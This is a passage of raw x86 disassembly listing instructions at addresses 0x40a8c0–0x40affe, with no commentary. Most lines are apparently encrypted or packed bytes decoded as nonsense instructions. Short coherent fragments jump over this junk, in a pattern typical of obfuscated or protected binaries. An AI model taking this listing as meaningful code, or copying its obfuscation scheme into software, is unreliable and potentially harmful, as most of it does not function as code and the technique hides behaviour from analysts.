  40a8c0:	push   0x32143cbe
  40a8c5:	xchg   ebx,eax
  40a8c6:	hlt    
  40a8c7:	sbb    DWORD PTR [edi],ecx
  40a8c9:	mov    bl,0xec
  40a8cb:	dec    ecx
  40a8cc:	sub    eax,0x11c6e352
  40a8d1:	dec    ecx
  40a8d2:	out    0x2c,eax
  40a8d4:	mov    eax,DWORD PTR [eax+0x56]
  40a8d7:	adc    BYTE PTR [ebx],cl
  40a8d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8da:	adc    eax,DWORD PTR [ebx-0x2d895fcb]
  40a8e0:	jecxz  0x40a94c
  40a8e2:	jg     0x40a8f4
  40a8e4:	enter  0x321e,0x16
  40a8e8:	xchg   esp,eax
  40a8e9:	sub    esi,DWORD PTR [ebp+0x22f8ca29]
  40a8ef:	clc    
  40a8f0:	dec    eax
  40a8f1:	dec    esp
  40a8f2:	adc    al,0xd2
  40a8f4:	cmp    eax,0xf382cbf8
  40a8f9:	sub    DWORD PTR [ebx],edi
  40a8fb:	inc    esp
  40a8fc:	dec    ecx
  40a8fd:	imul   edi,DWORD PTR [esi+0x4e390117],0xffffffc6
  40a904:	xchg   edi,eax
  40a905:	test   BYTE PTR [esi],ah
  40a907:	mov    bh,0x75
  40a909:	iret   
  40a90a:	xchg   ah,bl
  40a90c:	sbb    eax,DWORD PTR [ebp+0x49e5e438]
  40a912:	sub    BYTE PTR [eax-0x18f08636],0xcd
  40a919:	cld    
  40a91a:	fdivr  DWORD PTR [esi-0x75]
  40a91d:	fldcw  WORD PTR [ebx-0x53]
  40a920:	cmp    al,0x3f
  40a922:	mov    DWORD PTR [eax],edi
  40a924:	mov    eax,DWORD PTR [ebp-0x14]
  40a927:	mov    ebx,DWORD PTR [ebp-0x8]
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    DWORD PTR ds:0xdadd786d,esi
  40a94c:	cmp    DWORD PTR [eax+0x78],0x74
  40a950:	jle    0x40a9ca
  40a952:	js     0x40a959
  40a954:	push   ecx
  40a955:	and    BYTE PTR [ebx-0x42],0x67
  40a959:	mov    bl,0x37
  40a95b:	inc    ecx
  40a95c:	mov    esp,0xdb7c9fea
  40a961:	js     0x40a8ea
  40a963:	mov    dl,0x77
  40a965:	(bad)  
  40a966:	mov    ebp,0xe9893e3f
  40a96b:	mov    bl,0x2b
  40a96d:	sub    BYTE PTR [ebx-0x54],bh
  40a970:	mov    cl,0xae
  40a972:	sub    eax,0x59f5ecfb
  40a977:	inc    edi
  40a978:	mov    WORD PTR [ecx],?
  40a97a:	xor    ecx,DWORD PTR [ebp+0x63b3e83f]
  40a980:	fsubr  st(3),st
  40a982:	js     0x40a983
  40a984:	xor    BYTE PTR [ecx+eiz*2-0x1c],bl
  40a988:	repnz popa 
  40a98a:	sbb    esp,ecx
  40a98c:	dec    esp
  40a98d:	lods   eax,DWORD PTR ds:[esi]
  40a98e:	jmp    0x40a9f5
  40a990:	fcom   DWORD PTR [eax-0x53bc3af2]
  40a996:	aaa    
  40a997:	push   eax
  40a998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a999:	xchg   edi,eax
  40a99a:	in     al,0x84
  40a99c:	sub    dh,BYTE PTR [edi-0x6]
  40a99f:	ins    BYTE PTR es:[edi],dx
  40a9a0:	add    BYTE PTR [ebx-0x21],ch
  40a9a3:	push   cs
  40a9a4:	xor    dh,BYTE PTR [esi]
  40a9a6:	mov    ah,0x8c
  40a9a8:	daa    
  40a9a9:	repz dec esi
  40a9ab:	jecxz  0x40a9e9
  40a9ad:	jl     0x40a991
  40a9af:	mov    cl,0x72
  40a9b1:	sub    ecx,0x65
  40a9b4:	fisub  DWORD PTR [esi]
  40a9b6:	mov    ah,0x53
  40a9b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9b9:	jge    0x40a986
  40a9bb:	pop    ecx
  40a9bc:	push   ebx
  40a9bd:	in     eax,0x2d
  40a9bf:	fdivr  st,st(5)
  40a9c1:	sub    BYTE PTR [eax-0x7e],ah
  40a9c4:	(bad)  
  40a9c6:	or     eax,0x62949ba5
  40a9cb:	out    dx,al
  40a9cc:	mov    edx,DWORD PTR [ebp-0x67]
  40a9cf:	aad    0xc7
  40a9d1:	mov    ebp,DWORD PTR [ebx+0x40dcc094]
  40a9d7:	adc    al,0xed
  40a9d9:	dec    esi
  40a9da:	or     ebp,edx
  40a9dc:	ins    DWORD PTR es:[edi],dx
  40a9dd:	in     eax,0xd3
  40a9df:	inc    edx
  40a9e0:	dec    ebp
  40a9e1:	xor    ecx,DWORD PTR [eax+0x16]
  40a9e4:	nop
  40a9e5:	loopne 0x40aa2a
  40a9e7:	lds    ebx,FWORD PTR [edx]
  40a9e9:	jbe    0x40a9f8
  40a9eb:	push   edx
  40a9ec:	adc    eax,0x35caa268
  40a9f1:	sub    dl,BYTE PTR [edi*1-0x70b60e44]
  40a9f8:	lods   eax,DWORD PTR ds:[esi]
  40a9f9:	cdq    
  40a9fa:	sub    edi,eax
  40a9fc:	enter  0x471a,0x3
  40aa00:	pop    edx
  40aa01:	fisttp QWORD PTR [esi-0x8cc3726]
  40aa07:	aas    
  40aa08:	sbb    cl,BYTE PTR [ebp-0x7d]
  40aa0b:	sti    
  40aa0c:	loope  0x40a994
  40aa0e:	sub    BYTE PTR [ebx+0x284a206e],dl
  40aa14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa15:	pop    esp
  40aa16:	pop    es
  40aa17:	mov    cl,0xe2
  40aa19:	cmp    ah,BYTE PTR [edx+0x3a16364c]
  40aa1f:	lahf   
  40aa20:	inc    esp
  40aa21:	cmp    DWORD PTR [edi+esi*2-0x35],eax
  40aa25:	loopne 0x40a9c0
  40aa27:	pop    es
  40aa28:	into   
  40aa29:	pushf  
  40aa2a:	mov    ebx,esi
  40aa2c:	mov    ecx,0xb356ae7e
  40aa31:	sbb    edx,esp
  40aa33:	xor    DWORD PTR [ecx-0x6477ac98],esi
  40aa39:	dec    ebp
  40aa3a:	mov    BYTE PTR [edi-0xc],dl
  40aa3d:	hlt    
  40aa3e:	add    BYTE PTR [eax+ebp*2-0x7a],ah
  40aa42:	xchg   ebp,eax
  40aa43:	sbb    cl,BYTE PTR [edx]
  40aa45:	lea    ebx,[ecx]
  40aa47:	lea    ebp,[edx-0x45a97aa8]
  40aa4d:	aas    
  40aa4e:	pop    edi
  40aa4f:	mov    dh,0x5
  40aa51:	jnp    0x40aab4
  40aa53:	inc    eax
  40aa54:	adc    BYTE PTR [edx-0x36],bh
  40aa57:	js     0x40aaa6
  40aa59:	fcmovbe st,st(7)
  40aa5b:	pop    es
  40aa5c:	aaa    
  40aa5d:	pop    bx
  40aa5f:	adc    DWORD PTR [edx-0xd],esi
  40aa62:	cmp    ah,BYTE PTR [ebx+0x748fbd60]
  40aa68:	jno    0x40aa76
  40aa6a:	sbb    al,0x3
  40aa6c:	cli    
  40aa6d:	call   0x91745f
  40aa72:	jl     0x40aaa6
  40aa74:	pushf  
  40aa75:	inc    ebx
  40aa76:	pop    edi
  40aa77:	pop    edx
  40aa78:	xchg   DWORD PTR [esi],ebx
  40aa7a:	aaa    
  40aa7b:	mov    al,0xb
  40aa7d:	daa    
  40aa7e:	adc    dh,dl
  40aa80:	mov    edi,0xf9491c04
  40aa85:	push   esp
  40aa86:	mov    esp,0x62b4eac4
  40aa8b:	retf   
  40aa8c:	cmc    
  40aa8d:	xchg   esi,eax
  40aa8e:	lods   al,BYTE PTR ds:[esi]
  40aa8f:	cdq    
  40aa90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa91:	fwait
  40aa92:	lods   al,BYTE PTR ds:[esi]
  40aa93:	or     al,0x9e
  40aa95:	inc    eax
  40aa96:	inc    ebp
  40aa97:	mov    ch,0x51
  40aa99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa9a:	out    dx,eax
  40aa9b:	sub    DWORD PTR [esi-0x51],eax
  40aa9e:	lods   al,BYTE PTR ds:[esi]
  40aa9f:	outs   dx,DWORD PTR ds:[esi]
  40aaa0:	scas   eax,DWORD PTR es:[edi]
  40aaa1:	push   cs
  40aaa2:	loope  0x40aa75
  40aaa4:	nop
  40aaa5:	mov    eax,ds:0xeff03dd1
  40aaaa:	lea    esp,[edx]
  40aaac:	inc    ebx
  40aaad:	xchg   ebp,eax
  40aaae:	(bad)  
  40aaaf:	fld    QWORD PTR [ebx-0x5befc304]
  40aab6:	or     ch,dl
  40aab8:	and    bh,cl
  40aaba:	push   es
  40aabb:	cdq    
  40aabc:	mov    esp,0x420a188a
  40aac1:	and    DWORD PTR [ebx-0x507e6d89],esi
  40aac7:	stos   DWORD PTR es:[edi],eax
  40aac8:	call   0x4355:0xc0a21c25
  40aacf:	and    eax,0xe3551952
  40aad4:	aad    0xe4
  40aad6:	imul   eax,DWORD PTR [esi+edx*8-0x48936c6c],0x8b7b2fcd
  40aae1:	pop    esp
  40aae2:	aam    0x2
  40aae4:	rol    ebx,1
  40aae6:	mov    ecx,?
  40aae8:	outs   dx,DWORD PTR ds:[esi]
  40aae9:	out    dx,eax
  40aaea:	inc    ecx
  40aaeb:	mov    ds:0xbf228c58,al
  40aaf0:	pop    esp
  40aaf1:	mov    al,0xd1
  40aaf3:	jne    0x40aabc
  40aaf5:	aam    0xed
  40aaf7:	test   BYTE PTR [ebx-0x30ed402a],cl
  40aafd:	sbb    eax,0x3e271e4c
  40ab02:	jo     0x40aaba
  40ab04:	pusha  
  40ab05:	xchg   edi,eax
  40ab06:	xor    BYTE PTR [edi-0x3df8adc6],bl
  40ab0c:	inc    edi
  40ab0d:	jno    0x40aa9c
  40ab0f:	push   eax
  40ab10:	mov    edi,0xcc33edc9
  40ab15:	mov    DWORD PTR [edx-0x8],edx
  40ab18:	xchg   ecx,eax
  40ab19:	rol    DWORD PTR [ecx-0x78],0xe0
  40ab1d:	jmp    0x61fda8de
  40ab22:	mov    bh,0xa2
  40ab24:	outs   dx,BYTE PTR ds:[esi]
  40ab25:	fnstenv [ebp+0x4b]
  40ab28:	imul   ebx,esi,0x6cacdeeb
  40ab2e:	sbb    DWORD PTR [ecx+0x34],0xfffffff9
  40ab32:	pop    ss
  40ab33:	fnsave [ebp+ecx*4+0x56f4bc3d]
  40ab3a:	aaa    
  40ab3b:	dec    ch
  40ab3d:	enter  0x7882,0x35
  40ab41:	mov    ah,0xe4
  40ab43:	fcomp  st(1)
  40ab45:	inc    edi
  40ab46:	jns    0x40abb6
  40ab48:	adc    DWORD PTR [ecx+0x73],ecx
  40ab4b:	mov    cl,0xe4
  40ab4d:	jmp    0x40abbc
  40ab4f:	call   FWORD PTR [esi-0xd5bc897]
  40ab55:	or     eax,0x37d409ce
  40ab5a:	mov    dh,0xcb
  40ab5c:	(bad)  
  40ab5d:	stos   DWORD PTR es:[edi],eax
  40ab5e:	out    dx,al
  40ab5f:	(bad)  
  40ab60:	in     eax,0x71
  40ab62:	bound  esp,QWORD PTR [esi]
  40ab64:	mov    bh,0x92
  40ab66:	mov    ah,0x22
  40ab68:	icebp  
  40ab69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab6a:	call   0x33b0:0x9d659d73
  40ab71:	mov    ah,0x1a
  40ab73:	stos   DWORD PTR es:[edi],eax
  40ab74:	aas    
  40ab75:	lea    esi,[eax-0x562490d3]
  40ab7b:	inc    ebp
  40ab7c:	ins    DWORD PTR es:[edi],dx
  40ab7d:	test   DWORD PTR [eax+0x40],ecx
  40ab80:	mov    al,0x58
  40ab82:	out    dx,eax
  40ab83:	sub    al,0x58
  40ab85:	mov    bl,0xd5
  40ab87:	sbb    DWORD PTR [ebx],0xffffffc5
  40ab8a:	mov    edi,0xd9ea716
  40ab8f:	dec    esp
  40ab90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab91:	out    dx,eax
  40ab92:	ss dec ecx
  40ab94:	in     eax,0xc7
  40ab96:	fmul   DWORD PTR [esi-0x38]
  40ab99:	push   edx
  40ab9a:	outs   dx,DWORD PTR ds:[esi]
  40ab9b:	mov    ss,WORD PTR [ecx]
  40ab9d:	cmp    bh,BYTE PTR [ebx]
  40ab9f:	or     eax,0x1a2acbf8
  40aba4:	jmp    0xc84a2d88
  40aba9:	pop    ecx
  40abaa:	mov    esp,0x2af23f35
  40abaf:	mov    edi,0x4faa32c0
  40abb4:	mov    DWORD PTR [edi],esp
  40abb6:	push   0x5fabb183
  40abbb:	loope  0x40ab51
  40abbd:	ret    0xfe50
  40abc0:	(bad)  
  40abc1:	xchg   ax,ax
  40abc3:	sti    
  40abc4:	imul   edx,DWORD PTR [edi-0x1d],0x62
  40abc8:	xchg   ecx,eax
  40abc9:	stc    
  40abca:	shl    BYTE PTR [edx-0x9],0xc
  40abce:	add    ebx,eax
  40abd0:	leave  
  40abd1:	push   es
  40abd2:	xor    BYTE PTR [edi+0x6c],bh
  40abd5:	lods   al,BYTE PTR ds:[esi]
  40abd6:	and    ch,BYTE PTR [ebx+0x10f04fe1]
  40abdc:	lods   al,BYTE PTR ds:[esi]
  40abdd:	inc    eax
  40abde:	daa    
  40abdf:	jae    0x40abfc
  40abe1:	aad    0x3f
  40abe3:	and    ecx,DWORD PTR [eax-0x161297db]
  40abe9:	cmp    eax,0x5b028677
  40abee:	push   edx
  40abef:	aas    
  40abf0:	retf   0xe487
  40abf3:	push   ebx
  40abf4:	push   ebp
  40abf5:	jmp    0x3b3d:0x1bdf833b
  40abfc:	mov    ebx,0x8901c7f5
  40ac01:	sahf   
  40ac02:	inc    edi
  40ac03:	std    
  40ac04:	and    edi,DWORD PTR [edi]
  40ac06:	jp     0x40ac56
  40ac08:	pusha  
  40ac09:	mov    dh,0x83
  40ac0b:	push   0xaadfe660
  40ac10:	mov    eax,0x19ccf342
  40ac15:	cmp    al,0xea
  40ac17:	sbb    al,0x14
  40ac19:	jae    0x40ac32
  40ac1b:	enter  0x6b46,0xba
  40ac1f:	sub    BYTE PTR [edi],dl
  40ac21:	push   edi
  40ac22:	sbb    edi,0x7d
  40ac25:	inc    ecx
  40ac26:	inc    esp
  40ac27:	mov    al,ds:0x9ed04151
  40ac2c:	pop    ebx
  40ac2d:	mov    dl,0xb0
  40ac2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac30:	xor    BYTE PTR [eax-0x6ae2865b],dh
  40ac36:	sbb    eax,0xf9900633
  40ac3b:	cmc    
  40ac3c:	jle    0x40ac1d
  40ac3e:	popf   
  40ac3f:	sub    ecx,ecx
  40ac41:	test   DWORD PTR [ebx+0x31],0x6e72f6f5
  40ac48:	fld    DWORD PTR [esi]
  40ac4a:	jmp    0x277e92bb
  40ac4f:	xor    ebx,ecx
  40ac51:	xor    edx,edx
  40ac53:	add    eax,esi
  40ac55:	add    ebx,esi
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	movhps QWORD PTR [edx-0x7f292f43],xmm4
  40ac92:	js     0x40ad0c
  40ac94:	je     0x40ad14
  40ac96:	js     0x40ad10
  40ac98:	out    0xf3,eax
  40ac9a:	aam    0xc1
  40ac9c:	jmp    0x86fc8a0a
  40aca1:	ror    BYTE PTR [ebx-0x704069b],0x3e
  40aca8:	popf   
  40aca9:	ret    0x7a7b
  40acac:	in     eax,0x15
  40acae:	dec    eax
  40acaf:	pop    esp
  40acb0:	pop    esi
  40acb1:	ret    
  40acb2:	popf   
  40acb3:	sub    eax,0x5970979a
  40acb8:	retf   0xd6d2
  40acbb:	(bad)  
  40acbc:	lds    ecx,FWORD PTR [ecx+0x5c214857]
  40acc2:	inc    edx
  40acc3:	mov    ds:0xc41dc39f,al
  40acc8:	xchg   esp,eax
  40acc9:	int3   
  40acca:	int3   
  40accb:	mov    edi,0x96ed5301
  40acd0:	and    al,0x9b
  40acd2:	inc    esp
  40acd3:	push   0x7e
  40acd5:	and    BYTE PTR [ebp+eiz*4-0x2737d7bf],dh
  40acdc:	inc    ecx
  40acdd:	add    esi,DWORD PTR [ecx-0x2e]
  40ace0:	ja     0x40ac9f
  40ace2:	imul   ebp,DWORD PTR [ecx-0x61],0xffffff93
  40ace6:	test   cl,bh
  40ace8:	emms   
  40acea:	out    0x11,al
  40acec:	js     0x40ac73
  40acee:	sub    ch,bh
  40acf0:	outs   dx,BYTE PTR ds:[esi]
  40acf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acf2:	xchg   esp,eax
  40acf3:	(bad)  
  40acf4:	dec    esi
  40acf5:	je     0x40acba
  40acf7:	mov    ds:0x6e15c710,eax
  40acfc:	stos   DWORD PTR es:[edi],eax
  40acfd:	into   
  40acfe:	sbb    BYTE PTR [edx],dl
  40ad00:	cmp    bh,dh
  40ad02:	sbb    eax,edi
  40ad04:	adc    eax,0x6f55b008
  40ad09:	stos   BYTE PTR es:[edi],al
  40ad0a:	mov    dl,0xad
  40ad0c:	ja     0x40ac93
  40ad0e:	lods   al,BYTE PTR ds:[esi]
  40ad0f:	jbe    0x40acfd
  40ad11:	jge    0x40ad2e
  40ad13:	sbb    cl,dh
  40ad15:	pusha  
  40ad16:	loop   0x40ad88
  40ad18:	add    eax,0x29d33cf1
  40ad1d:	(bad)  
  40ad1e:	std    
  40ad1f:	mov    ecx,0xd66ca0eb
  40ad24:	pop    ebp
  40ad25:	dec    ebp
  40ad26:	sbb    dh,BYTE PTR [eax+0x63]
  40ad29:	nop
  40ad2a:	push   ebx
  40ad2b:	dec    ebp
  40ad2c:	mov    edx,0x56794393
  40ad31:	imul   BYTE PTR [ecx-0x66890b85]
  40ad37:	out    dx,eax
  40ad38:	mov    ds:0x3889c563,eax
  40ad3d:	xchg   BYTE PTR [eax-0x39],ch
  40ad40:	pop    ecx
  40ad41:	push   edi
  40ad42:	jb     0x40ad19
  40ad44:	(bad)  
  40ad45:	mov    bh,BYTE PTR [edi+0x58]
  40ad48:	jnp    0x40ad58
  40ad4a:	dec    ebx
  40ad4b:	imul   eax,DWORD PTR [ecx+0x5529723b],0x63
  40ad52:	add    al,0x94
  40ad54:	push   edx
  40ad55:	sub    DWORD PTR [ebp+eax*4-0x10],ebp
  40ad59:	sbb    dl,BYTE PTR ds:0x3eef5d1
  40ad5f:	jge    0x40ace7
  40ad61:	mov    esi,0xd9b15876
  40ad66:	jecxz  0x40adce
  40ad68:	dec    edx
  40ad69:	loope  0x40addf
  40ad6b:	or     dh,0x9e
  40ad6e:	pop    ebp
  40ad6f:	(bad)  
  40ad70:	into   
  40ad71:	hlt    
  40ad72:	cmp    dh,BYTE PTR [edx+0xc8a4969]
  40ad78:	(bad)  
  40ad79:	std    
  40ad7a:	loope  0x40ad6d
  40ad7c:	cwde   
  40ad7d:	not    DWORD PTR [ebp-0x46]
  40ad80:	xor    ebp,DWORD PTR [ebx+0x5243cd24]
  40ad86:	fld    TBYTE PTR [edx+eax*4-0x22]
  40ad8a:	jnp    0x40adeb
  40ad8c:	mov    ch,0x37
  40ad8e:	adc    esi,esi
  40ad90:	in     eax,dx
  40ad91:	mov    edi,0x334b8808
  40ad96:	fbstp  TBYTE PTR [esi]
  40ad98:	out    0x37,al
  40ad9a:	inc    ebp
  40ad9b:	pop    edi
  40ad9c:	sbb    edi,0x72
  40ad9f:	sub    al,0x42
  40ada1:	mov    eax,ds:0xafa11264
  40ada6:	or     al,0x9d
  40ada8:	jne    0x40adbb
  40adaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adab:	fstp   TBYTE PTR [ebp-0x5]
  40adae:	shr    esi,cl
  40adb0:	sbb    esp,DWORD PTR [eax+esi*4]
  40adb3:	repz imul esi,DWORD PTR [edi],0xffffffd8
  40adb7:	or     BYTE PTR [ecx-0x26],ah
  40adba:	pop    eax
  40adbb:	xchg   ebp,eax
  40adbc:	fsub   st(2),st
  40adbe:	inc    ebx
  40adbf:	cmp    al,0x3e
  40adc1:	add    BYTE PTR ds:0x91891608,ah
  40adc7:	dec    ebx
  40adc8:	faddp  st(1),st
  40adca:	ss gs jae 0x40ae40
  40adce:	cmp    al,0x1d
  40add0:	ins    DWORD PTR es:[edi],dx
  40add1:	shl    DWORD PTR [ecx+0x5d],cl
  40add4:	cli    
  40add5:	lods   al,BYTE PTR ds:[esi]
  40add6:	jle    0x40adfc
  40add8:	mov    ebp,0x6707582
  40addd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adde:	adc    ebx,DWORD PTR [esi]
  40ade0:	or     eax,0x70dcba2d
  40ade5:	icebp  
  40ade6:	cwde   
  40ade7:	int3   
  40ade8:	popw   ss
  40adea:	in     al,0x76
  40adec:	stos   DWORD PTR es:[edi],eax
  40aded:	cdq    
  40adee:	in     eax,dx
  40adef:	dec    edi
  40adf0:	sahf   
  40adf1:	test   al,0x89
  40adf3:	daa    
  40adf4:	add    al,0x2b
  40adf6:	sub    al,0x2d
  40adf8:	xchg   DWORD PTR [esp+eiz*2+0x3bc62d69],esi
  40adff:	mov    edx,0xe13ef343
  40ae04:	dec    edx
  40ae05:	in     eax,0x8e
  40ae07:	mov    ds,WORD PTR [ebx]
  40ae09:	cmp    dl,dl
  40ae0b:	fst    DWORD PTR [esi+0x3225c32]
  40ae11:	in     eax,dx
  40ae12:	fnstenv [ebp+0x71e78695]
  40ae18:	mov    ah,0x87
  40ae1a:	xchg   esp,eax
  40ae1b:	jmp    0x40ae30
  40ae1d:	scas   al,BYTE PTR es:[edi]
  40ae1e:	jo     0x40ae97
  40ae20:	xor    al,0x85
  40ae22:	push   ecx
  40ae23:	(bad)  
  40ae24:	cmp    eax,0xf3a575b3
  40ae29:	sub    al,0x7e
  40ae2b:	add    ebp,esi
  40ae2d:	loopne 0x40ae02
  40ae2f:	int3   
  40ae30:	(bad)  
  40ae31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae32:	and    ecx,DWORD PTR [esi+0x554d2752]
  40ae38:	push   edx
  40ae39:	add    eax,0xd52ac08a
  40ae3e:	or     BYTE PTR [ecx+0x54aa2bfa],ah
  40ae44:	mov    esi,0x1865f2c5
  40ae49:	push   edx
  40ae4a:	push   esi
  40ae4b:	pop    cx
  40ae4d:	sbb    dl,dl
  40ae4f:	sub    eax,0xdf829555
  40ae54:	lock sbb ch,BYTE PTR [ebp-0x71]
  40ae58:	mov    eax,ds:0x76c0f6a
  40ae5d:	jbe    0x40ae37
  40ae5f:	sbb    al,0x73
  40ae61:	scas   al,BYTE PTR es:[edi]
  40ae62:	jp     0x40ae26
  40ae64:	fdivr  DWORD PTR [ebp+0x4a]
  40ae67:	xchg   BYTE PTR [ecx-0x6621c49f],ch
  40ae6d:	xchg   edi,eax
  40ae6e:	(bad)  
  40ae6f:	mov    WORD PTR [edx+0x32e612aa],fs
  40ae75:	mov    dl,0x4a
  40ae77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae78:	nop
  40ae79:	inc    dl
  40ae7b:	cmp    eax,0x722113d5
  40ae80:	mov    ah,0x17
  40ae82:	push   esi
  40ae83:	sbb    al,BYTE PTR [edi+eax*2+0x1fbf2bb5]
  40ae8a:	ss dec esp
  40ae8c:	js     0x40ae66
  40ae8e:	scas   al,BYTE PTR es:[edi]
  40ae8f:	shl    DWORD PTR [esi],1
  40ae91:	in     eax,0xa7
  40ae93:	sbb    DWORD PTR [edi+ebp*4],esp
  40ae96:	sbb    bl,BYTE PTR [edx+ebx*2+0x4e6d127f]
  40ae9d:	xchg   ebp,eax
  40ae9e:	dec    esp
  40ae9f:	pusha  
  40aea0:	mov    cl,0xfa
  40aea2:	jp     0x40ae28
  40aea4:	in     eax,dx
  40aea5:	ds or  al,0x19
  40aea8:	loope  0x40aec5
  40aeaa:	mov    esp,0x3082fe06
  40aeaf:	sbb    DWORD PTR [edi],esi
  40aeb1:	arpl   cx,cx
  40aeb3:	dec    eax
  40aeb4:	sbb    dh,BYTE PTR [edi]
  40aeb6:	mov    dl,0x47
  40aeb8:	or     BYTE PTR [esi-0x6908e3e8],cl
  40aebe:	add    DWORD PTR [ebp+0x4b],ebp
  40aec1:	sub    DWORD PTR [edx-0x7e646d7d],ebp
  40aec7:	jb     0x40ae9c
  40aec9:	add    DWORD PTR [edi+edx*8],eax
  40aecc:	push   ebp
  40aecd:	pop    ebp
  40aece:	stc    
  40aecf:	es pop ds
  40aed1:	ud2    
  40aed3:	dec    edi
  40aed4:	and    ch,BYTE PTR [esi+eax*1-0x2a]
  40aed8:	ror    BYTE PTR [ebx+edi*8],0xcd
  40aedc:	test   ah,0xb4
  40aedf:	add    dl,BYTE PTR [ecx]
  40aee1:	mov    dl,0x3a
  40aee3:	retf   
  40aee4:	pop    esi
  40aee5:	out    0xcc,ax
  40aee8:	test   eax,0x8a2047c7
  40aeed:	dec    ebp
  40aeee:	shr    DWORD PTR [edx],cl
  40aef0:	jae    0x40ae85
  40aef2:	adc    dl,BYTE PTR [edx-0x7c]
  40aef5:	sbb    eax,0xec8e9c03
  40aefa:	fld    QWORD PTR [edx]
  40aefc:	out    0xa2,al
  40aefe:	xor    eax,DWORD PTR [esi+0xbdb1d5b]
  40af04:	add    BYTE PTR [eax+0x32bb1188],0x38
  40af0b:	xor    BYTE PTR [edi-0xda86d67],ah
  40af11:	mov    dh,0x51
  40af13:	ret    
  40af14:	(bad)  
  40af15:	ins    BYTE PTR es:[edi],dx
  40af16:	ror    DWORD PTR [eax],1
  40af18:	add    eax,0x27559c55
  40af1d:	aam    0x68
  40af1f:	mov    ebp,0xcdecc5a8
  40af24:	(bad)  
  40af26:	cdq    
  40af27:	pop    ecx
  40af28:	add    DWORD PTR [eax-0x7e],0xd998570e
  40af2f:	fistp  DWORD PTR [edi-0x72]
  40af32:	psubw  mm3,QWORD PTR [edx-0x472e3740]
  40af39:	sbb    DWORD PTR [edx],0x363d7b3d
  40af3f:	rcl    BYTE PTR [esi+0x74],cl
  40af42:	ror    BYTE PTR [esi-0x7f],1
  40af45:	ret    
  40af46:	iret   
  40af47:	iret   
  40af48:	call   0xf229:0x4ed6cf79
  40af4f:	push   0xffffff9c
  40af51:	add    al,BYTE PTR [edx]
  40af53:	adc    eax,0x10950679
  40af58:	mov    cl,0x4f
  40af5a:	in     al,dx
  40af5b:	sub    dl,dl
  40af5d:	jecxz  0x40aef1
  40af5f:	mov    ?,edi
  40af61:	mov    ah,0x91
  40af63:	add    ecx,esp
  40af65:	inc    ebx
  40af66:	or     edi,DWORD PTR [ecx]
  40af68:	xor    BYTE PTR [edx-0x1d],bl
  40af6b:	popf   
  40af6c:	pop    edi
  40af6d:	push   ecx
  40af6e:	faddp  st(0),st
  40af70:	and    bl,BYTE PTR [ecx-0x34796e66]
  40af76:	and    cl,al
  40af78:	mov    edi,0x309f6351
  40af7d:	pop    ss
  40af7e:	fucomp st(3)
  40af80:	and    al,0x71
  40af82:	jp     0x40af8f
  40af84:	inc    ebx
  40af85:	pop    ebp
  40af86:	cmp    edx,edx
  40af88:	ror    DWORD PTR [edi+0x1c3ebbf7],cl
  40af8e:	xchg   DWORD PTR [esi],edi
  40af90:	jnp    0x40afd6
  40af92:	pop    edx
  40af93:	ror    DWORD PTR [ebx-0x122d96f0],cl
  40af99:	test   eax,0x1089f89e
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	dec    ebp
  40afb3:	les    ecx,FWORD PTR [esi+0x7885d26d]
  40afb9:	js     0x40b02f
  40afbb:	jle    0x40b035
  40afbd:	js     0x40afbb
  40afbf:	adc    BYTE PTR [ecx-0x77d9cbf6],0xa5
  40afc6:	dec    eax
  40afc7:	mov    ch,0xd8
  40afc9:	push   0xffffffc8
  40afcb:	(bad)  
  40afcc:	repz pop es
  40afce:	out    0x7b,al
  40afd0:	cmc    
  40afd1:	mov    esi,0xa0995610
  40afd6:	jmp    0x40b02c
  40afd8:	sar    BYTE PTR [eax-0x43],cl
  40afdb:	xchg   ebx,eax
  40afdc:	pop    ss
  40afdd:	xchg   BYTE PTR [eax],al
  40afdf:	leave  
  40afe0:	dec    esi
  40afe1:	(bad)  
  40afe2:	aas    
  40afe3:	dec    eax
  40afe4:	loop   0x40afc7
  40afe6:	ja     0x40afff
  40afe8:	dec    ebp
  40afe9:	adc    DWORD PTR [esi-0x412d914c],0x9d281a1a
  40aff3:	fwait
  40aff4:	mov    ebp,0xd17237ff
  40aff9:	clc    
  40affa:	int    0x4f
  40affc:	jge    0x40b067
  40affe:	scas   al,BYTE PTR es:[edi]
